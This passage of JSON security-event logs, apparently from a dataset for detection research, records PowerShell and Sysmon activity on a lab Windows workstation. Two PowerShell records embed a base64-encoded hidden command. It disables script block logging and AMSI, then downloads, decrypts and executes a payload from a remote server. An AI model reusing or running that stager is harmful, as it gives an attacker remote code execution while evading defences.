{"Message":"Pipeline execution details for command line:     $ConsentPrompt = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System).ConsentPromptBehaviorAdmin\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=3113\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=e0c721de-e388-4e12-b87b-cd7d6e01790c\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Win Hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAEUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAGUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwARQBjAFQASQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAQwBUAGkAbwBuAEEAcgB5AFsAcwB0AFIAaQBOAGcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAQwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAGwAcwBlAHsAWwBTAGMAcgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBlAFQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgBVAEwATAAsACgATgBlAHcALQBPAEIASgBlAGMAdAAgAEMAbwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAEEAcwBIAFMARQBUAFsAUwB0AFIASQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUARgBdAC4AQQBzAFMARQBtAEIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQATgB1AGwAbAAsACQAdABSAFUAZQApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABvAEkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAG4AdABpAE4AVQBFAD0AMAA7ACQARgA5ADQAZQA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AYwBvAEQAaQBOAEcAXQA6ADoAVQBOAGkAQwBPAGQARQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAcgBUAF0AOgA6AEYAUgBPAE0AQgBhAHMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABGADkANABFAC4AUAByAG8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBFAGIAUgBFAFEAdQBlAFMAdABdADoAOgBEAEUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBDAFIARQBEAEUAbgBUAEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBhAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUARABFAE4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAVABlAFMAKAAnAD4AaQBeAEwAfgBmACUAeQBbACgAUgBwADAAbgBkAGoALwBQADwASgBrADMAPQBoAEgAcQBlAHQARQA/ADYALQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AGUALgBIAEUAYQBkAGUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEcAQgBmAFIAYgBIAGMAcABjAHcAdgA9AGwAVwBsAEMAZwBrAHMAeQBMADMAUAB4AEwAcABBAHkARwB4AEYASQBqAFYATABYADQAMABBAD0AIgApADsAJABEAGEAVABBAD0AJABmADkANABFAC4ARABPAFcATgBsAE8AQQBEAEQAYQBUAGEAKAAkAHMARQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAGwAZQBOAEcAdABIAF0AOwAtAEoATwBpAE4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=0cdca6a7-e64c-4b73-be25-b18db6018f6b\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=    $ConsentPrompt = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System).ConsentPromptBehaviorAdmin\n \r\n\r\nDetails: \r\nCommandInvocation(Get-ItemProperty): \"Get-ItemProperty\"\r\nParameterBinding(Get-ItemProperty): name=\"Path\"; value=\"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\"\r\n","Opcode":"Info","SourceName":"PowerShell","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","ThreadID":0,"RecordNumber":3487,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":36028797018963968,"Severity":"INFO","host":"wec.internal.cloudapp.net","EventID":800,"port":53971,"@version":"1","Category":"Pipeline Execution Details","EventReceivedTime":"2020-09-04 03:30:13","Task":8,"EventTime":"2020-09-04 03:30:12","Channel":"Windows PowerShell","@timestamp":"2020-09-04T07:30:13.759Z","SourceModuleType":"im_msvistalog","ExecutionProcessID":0,"tags":["mordorDataset"]}
{"Message":"Pipeline execution details for command line:     $SecureDesktopPrompt = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System).PromptOnSecureDesktop\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=3115\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=e0c721de-e388-4e12-b87b-cd7d6e01790c\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Win Hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAEUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAGUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwARQBjAFQASQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAQwBUAGkAbwBuAEEAcgB5AFsAcwB0AFIAaQBOAGcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAQwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAGwAcwBlAHsAWwBTAGMAcgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBlAFQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgBVAEwATAAsACgATgBlAHcALQBPAEIASgBlAGMAdAAgAEMAbwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAEEAcwBIAFMARQBUAFsAUwB0AFIASQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUARgBdAC4AQQBzAFMARQBtAEIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQATgB1AGwAbAAsACQAdABSAFUAZQApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABvAEkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAG4AdABpAE4AVQBFAD0AMAA7ACQARgA5ADQAZQA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AYwBvAEQAaQBOAEcAXQA6ADoAVQBOAGkAQwBPAGQARQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAcgBUAF0AOgA6AEYAUgBPAE0AQgBhAHMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABGADkANABFAC4AUAByAG8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBFAGIAUgBFAFEAdQBlAFMAdABdADoAOgBEAEUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBDAFIARQBEAEUAbgBUAEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBhAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUARABFAE4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAVABlAFMAKAAnAD4AaQBeAEwAfgBmACUAeQBbACgAUgBwADAAbgBkAGoALwBQADwASgBrADMAPQBoAEgAcQBlAHQARQA/ADYALQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AGUALgBIAEUAYQBkAGUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEcAQgBmAFIAYgBIAGMAcABjAHcAdgA9AGwAVwBsAEMAZwBrAHMAeQBMADMAUAB4AEwAcABBAHkARwB4AEYASQBqAFYATABYADQAMABBAD0AIgApADsAJABEAGEAVABBAD0AJABmADkANABFAC4ARABPAFcATgBsAE8AQQBEAEQAYQBUAGEAKAAkAHMARQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAGwAZQBOAEcAdABIAF0AOwAtAEoATwBpAE4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=0cdca6a7-e64c-4b73-be25-b18db6018f6b\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System).PromptOnSecureDesktop\n \r\n\r\nDetails: \r\nCommandInvocation(Get-ItemProperty): \"Get-ItemProperty\"\r\nParameterBinding(Get-ItemProperty): name=\"Path\"; value=\"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\"\r\n","Opcode":"Info","SourceName":"PowerShell","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","ThreadID":0,"RecordNumber":3488,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":36028797018963968,"Severity":"INFO","host":"wec.internal.cloudapp.net","EventID":800,"port":53971,"@version":"1","Category":"Pipeline Execution Details","EventReceivedTime":"2020-09-04 03:30:13","Task":8,"EventTime":"2020-09-04 03:30:12","Channel":"Windows PowerShell","@timestamp":"2020-09-04T07:30:13.760Z","SourceModuleType":"im_msvistalog","ExecutionProcessID":0,"tags":["mordorDataset"]}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:30:12.496\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 7376\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"7376","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309562,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:30:12.496","EventTime":"2020-09-04 03:30:12","EventReceivedTime":"2020-09-04 03:30:13","@timestamp":"2020-09-04T07:30:13.760Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:30:12.496\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 7376\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"7376","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309563,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:30:12.496","EventTime":"2020-09-04 03:30:12","EventReceivedTime":"2020-09-04 03:30:13","@timestamp":"2020-09-04T07:30:13.760Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:30:12.496\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 1808\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"1808","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT 